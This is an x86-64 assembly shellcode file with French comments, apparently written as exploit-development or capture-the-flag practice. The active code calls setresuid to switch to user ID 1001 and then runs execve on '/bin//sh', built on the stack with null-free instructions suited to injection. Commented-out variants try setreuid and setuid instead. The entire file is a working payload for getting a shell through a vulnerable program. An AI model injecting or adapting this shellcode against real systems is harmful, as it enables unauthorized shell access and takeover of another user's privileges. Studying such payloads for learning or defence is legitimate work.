; pour trouver le numéro du syscall
; grep write /usr/src/linux-headers-6.11.2-amd64/arch/x86/include/generated/asm/syscalls_64.h
; __SYSCALL(1, sys_write)

BITS 64
;    xor    rdi, rdi
;    xor    rax, rax
;    xor    rsi, rsi
;    mov    si, 1001
;    mov    di, 1001
;    mov    al, 0x71
;    syscall
;xor    rdi,rdi
;xor    rax,rax
;mov    di, 1002
;mov    al,0x69
;syscall
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov di, 1001
mov si, 1001
mov dx, 1001
mov al, 0x75
syscall

xor rax, rax
mov al, 0x3b
xor rsi, rsi
push rsi
mov r8, 0x68732f2f6e69622f
push r8;
mov rdi, rsp; obtenir une adresse avec push et mov
push rsi
mov rdx, rsp
push rdi
mov rsi, rsp
syscall